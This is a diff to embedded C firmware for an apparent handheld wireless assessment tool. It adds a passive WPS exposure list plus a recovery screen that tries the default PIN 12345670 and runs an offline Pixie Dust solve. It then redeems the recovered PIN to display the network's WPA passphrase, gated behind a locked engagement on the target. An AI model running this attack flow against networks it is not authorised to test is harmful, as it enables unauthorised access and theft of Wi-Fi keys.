@@ -1335,7 +1335,7 @@ typedef enum {
     ST_HOME, ST_WIFI, ST_NETWORKS, ST_TARGET, ST_LABEL,
     ST_ATTACKS, ST_ATTACK, ST_HOLD, ST_ASK, ST_RESULTS,
     ST_BLE, ST_BLE_DEV, ST_RECON, ST_CHANNELS, ST_FRAMES, ST_CLIENTS,
-    ST_PROBES,
+    ST_PROBES, ST_WPS, ST_WPS_RUN,
 } state_t;
 
 static uint16_t class_stripe(bas_class_t k)
@@ -1436,6 +1436,7 @@ void app_main(void)
     state_t  st_cur = ST_HOME;
     int  home_sel = 0, wifi_sel = 0, net_sel = 0, atk_sel = 0;
     int  recon_sel = 0, cli_sel = 0, probe_sel = 0, ble_sel = 0, bdev_sel = 0;
+    int  wps_sel = 0;
     /* Whichever section's list is open. The detail, hold and run screens are
      * identical for Wi-Fi and BLE, so they follow this rather than each
      * knowing which section they came from. */
@@ -2001,18 +2002,21 @@ void app_main(void)
             rows[3] = (bas_row_t){ "Probes",
                                    on ? "names devices are asking for"
                                       : "needs the receiver", 0, on };
-            rows[4] = (bas_row_t){ on ? "Stop listening" : "Start listening",
+            rows[4] = (bas_row_t){ "WPS exposure",
+                                   "graded from beacons, sends nothing",
+                                   0, s_scan.count > 0 };
+            rows[5] = (bas_row_t){ on ? "Stop listening" : "Start listening",
                                    on ? "release the radio"
                                       : "receive-only, hops the band",
                                    0, true };
             if (redraw) {
-                bas_ui_list("Recon", on ? "live" : NULL, rows, 5, recon_sel,
+                bas_ui_list("Recon", on ? "live" : NULL, rows, 6, recon_sel,
                             "LEFT open   hold LEFT back");
                 redraw = false;
             }
-            if (next) { recon_sel = (recon_sel + 1) % 5; redraw = true; }
+            if (next) { recon_sel = (recon_sel + 1) % 6; redraw = true; }
             if (back) { st_cur = ST_HOME; redraw = true; break; }
-            int hit = tap ? bas_ui_list_hit(tx, ty, recon_sel, 5) : -1;
+            int hit = tap ? bas_ui_list_hit(tx, ty, recon_sel, 6) : -1;
             if (hit >= 0) {
                 if (hit == recon_sel) { accept = true; }
                 else { recon_sel = hit; redraw = true; }
@@ -2035,13 +2039,136 @@ void app_main(void)
                     st_cur = ST_CLIENTS;
                     break;
                 case 3: probe_sel = 0; st_cur = ST_PROBES; break;
-                case 4:
+                case 4: wps_sel = 0; st_cur = ST_WPS; break;
+                case 5:
                     if (on) { bas_sniff_stop(); } else { bas_sniff_start(0); }
                     break;
                 default: break;
                 }
                 redraw = true;
             }
+            break;
+        }
+
+        case ST_WPS: {
+            /* Only the networks that actually advertise WPS. A list padded
+             * with the 36 that do not would bury the finding. */
+            static int      idx[BAS_MAX_APS];
+            static char     sub[10][40];
+            int n = 0;
+            for (unsigned i = 0; i < s_scan.count && n < BAS_MAX_APS; i++) {
+                if (bas_wps_grade(&s_scan.ap[i].wps) != BAS_WPS_NONE) {
+                    idx[n++] = (int)i;
+                }
+            }
+            if (n == 0) {
+                bas_ui_note("WPS exposure", "No network in range",
+                            "advertises WPS.", TH_OK);
+                if (back || accept || tap) { st_cur = ST_RECON; redraw = true; }
+                break;
+            }
+            if (wps_sel >= n) { wps_sel = 0; }
+
+            int shown = (n > 10) ? 10 : n;
+            for (int i = 0; i < shown; i++) {
+                const bas_ap_t *a = &s_scan.ap[idx[i]];
+                bas_wps_risk_t r  = bas_wps_grade(&a->wps);
+                snprintf(sub[i], sizeof(sub[i]), "ch%u %ddBm  %s",
+                         (unsigned)a->channel, (int)a->rssi,
+                         bas_wps_risk_name(r));
+                rows[i] = (bas_row_t){
+                    a->hidden ? "(hidden)" : a->ssid, sub[i],
+                    /* Locked is the only WPS state that is not a live
+                     * exposure, so it is the only one not marked. */
+                    (r == BAS_WPS_LOCKED) ? TH_OK
+                        : (r == BAS_WPS_PIN_OPEN || r == BAS_WPS_REGISTRAR)
+                            ? TH_STOP : TH_WARN,
+                    true };
+            }
+            if (redraw) {
+                bas_ui_list("WPS exposure", NULL, rows, shown, wps_sel,
+                            "LEFT recover   hold LEFT back");
+                redraw = false;
+            }
+            if (back) { st_cur = ST_RECON; redraw = true; break; }
+            if (next) { wps_sel = (wps_sel + 1) % shown; redraw = true; }
+            int hit = tap ? bas_ui_list_hit(tx, ty, wps_sel, shown) : -1;
+            if (hit >= 0) {
+                if (hit == wps_sel) { accept = true; }
+                else { wps_sel = hit; redraw = true; }
+            }
+            if (accept) {
+                const bas_ap_t *a = &s_scan.ap[idx[wps_sel]];
+                /* Recovery associates with the AP and is logged by it, so it
+                 * needs the same authorisation as any other emission. The
+                 * engagement must already name THIS network -- selecting a row
+                 * here is not consent to attack it. */
+                if (!s_engage.locked ||
+                    !bas_mac_eq(a->bssid, s_engage.target.bssid)) {
+                    bas_ui_note("Not authorised",
+                                "Lock an engagement on",
+                                "this network first.", TH_WARN);
+                    vTaskDelay(pdMS_TO_TICKS(1800));
+                    redraw = true;
+                } else {
+                    st_cur = ST_WPS_RUN;
+                    redraw = true;
+                }
+            }
+            break;
+        }
+
+        case ST_WPS_RUN: {
+            /* One exchange, then the offline solve. Drawn before the work
+             * starts because the exchange blocks for up to thirty seconds and
+             * a frozen screen reads as a crash. */
+            bas_ui_note("WPS recovery",
+                        "One exchange, then",
+                        "solving offline...", TH_WARN);
+
+            static bas_wpsatk_result_t wr;
+            memset(&wr, 0, sizeof(wr));
+            (void)bas_wpsatk_try(12345670u, 30000u, &wr);
+
+            if (wr.have_material) {
+                bas_pixie_run(&wr.material, &wr.pixie);
+            }
+
+            /* A WPA passphrase runs to 63 characters. Sizing this to fit the
+             * screen instead would silently truncate a recovered key, which
+             * is worse than not recovering it: a half-key looks like an
+             * answer. It is stored whole here; the console prints it whole. */
+            static char l1[48], l2[72];
+            if (wr.pixie.found) {
+                static bas_wpsatk_result_t gr;
+                memset(&gr, 0, sizeof(gr));
+                snprintf(l1, sizeof(l1), "PIN %08u",
+                         (unsigned)wr.pixie.pin);
+                bas_ui_note("PIN recovered", l1, "redeeming...", TH_STOP);
+                (void)bas_wpsatk_try(wr.pixie.pin, 30000u, &gr);
+                if (gr.have_cred) {
+                    snprintf(l2, sizeof(l2), "%s", gr.passphrase);
+                    bas_ui_note("Key recovered", l1, l2, TH_STOP);
+                } else {
+                    bas_ui_note("PIN recovered", l1,
+                                "no key returned", TH_STOP);
+                }
+            } else if (wr.have_cred) {
+                snprintf(l1, sizeof(l1), "default PIN 12345670");
+                snprintf(l2, sizeof(l2), "%s", wr.passphrase);
+                bas_ui_note("Key recovered", l1, l2, TH_STOP);
+            } else if (wr.have_material) {
+                /* A real finding, and it must not read as a failure of the
+                 * tool: the registrar's nonces were sound. */
+                bas_ui_note("Not vulnerable", "Registrar nonces were",
+                            "not predictable.", TH_OK);
+            } else {
+                bas_ui_note("No WPS exchange", "The AP did not answer",
+                            "an enrollee.", TH_WARN);
+            }
+            /* Stay put until dismissed: a recovered key must not vanish while
+             * the operator is reaching for a notebook. */
+            if (back || accept || tap) { st_cur = ST_WPS; redraw = true; }
             break;
         }
 
